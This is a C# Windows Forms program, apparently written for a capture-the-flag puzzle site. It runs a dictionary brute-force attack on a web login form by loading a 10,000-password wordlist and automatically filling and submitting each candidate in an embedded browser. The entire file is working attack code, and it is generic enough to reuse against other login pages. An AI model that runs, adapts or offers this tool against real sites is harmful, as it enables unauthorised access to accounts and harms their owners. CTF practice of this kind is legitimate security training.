using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PasswordBruteForce
{
    public partial class Form1 : Form
    {
        public List<string> Passwords;
        string CurrentPassword;
        public Form1()
        {
            InitializeComponent();

            Passwords = new List<string>(System.IO.File.ReadAllLines(@"C:\Development\RandomProjects\PasswordBruteForce\10k.txt"));
            CurrentPassword = Passwords[0];

        }
        private void Form1_Load(object sender, EventArgs e)
        {
           
        }
        void Browser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
           
            HtmlElement ResultsSpan = Browser.Document.GetElementById("Content_Results");
            if(ResultsSpan != null)
            {
                if (ResultsSpan.InnerText == "Wrong password." || ResultsSpan.InnerText == null)
                {
                    Console.Write("Nope");
                }
                else
                {
                    Console.Write("We Got it");
                }
            }
            HtmlElement PasswordBox = Browser.Document.GetElementById("Content_Password");
            if (PasswordBox != null)
            {
                PasswordBox.SetAttribute("value", CurrentPassword);
            }

            HtmlElement submitButton = Browser.Document.GetElementById("Content_Submit");
            if (submitButton != null)
            {
                submitButton.InvokeMember("click");
            }
            if (Passwords.Count > 1)
            {
                Passwords.RemoveAt(0);
                CurrentPassword = Passwords[0];
            }
            else
            {
                Application.Exit();
            }
            
        }
        public void TryNext()
        {
            

        }

        private void Form1_Load_1(object sender, EventArgs e)
        {
            Browser.DocumentCompleted += Browser_DocumentCompleted;
            Browser.Navigate("https://ctfteasers.cloudapp.net/11.aspx");
        }
    }
}
